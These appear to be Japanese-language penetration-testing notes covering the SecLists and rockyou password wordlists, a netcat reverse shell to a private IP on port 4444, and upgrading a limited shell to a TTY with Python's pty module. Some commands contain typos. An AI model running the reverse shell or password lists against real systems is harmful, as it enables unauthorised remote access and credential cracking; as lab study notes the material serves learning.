| 動作 | command | 備考 |
|-----|-----|-----|
| 辞書ファイル | wget　https://github.com/danielmiessler/SecLists/archive/refs/heads/master.zip | ネットからダウンロード |
| 辞書ファイル解凍 | unzip master.zip<br>mv SecList-master/Slist | 名前も短く使いやすいように |
| rockyouファイル | /usr/share/wordlist/rockyou.txt<br>wc -l rockyou.txt<br>14344392 rockyou.txt ⇒14344392個のパスワード | Kali,Parrotにはデフォルトで実装 |
| ログインシェルの確認 | shopt login_\shell<br>login_shell of(on)<br>on(ログインシェル)<br>off(非ログインシェル) | |
| Netcatを利用したシンプルなリバースシェル | nc nlvp 4444<br>nc 192.168.54.101 4444 -e /bin/bash | |

**-eがサポートされていないため使用不可だった**

### 不完全なシェルの問題点
- su,sudo,sshのようなコマンドは適切な端末上でなければ実行できない
- 標準得エラー出力されないことがある
- テキストエディターをうまく操作できない
- Tabキーによる入力補完ができない
- 上下キーでコマンド履歴を参照できない
- ジョブ制御ができない

###【第１段階】Pythonのptyモジュールを用いてttyシェルに切り替える
1.ptyモジュールを用いるコマンドを実行
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
*または *
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
2.対話的シェルかどうか確かめる
```bash
echo $-
```
```bash
echo $PS1
```
3.得られた環境下で入力テスト

**su** が使えるなど
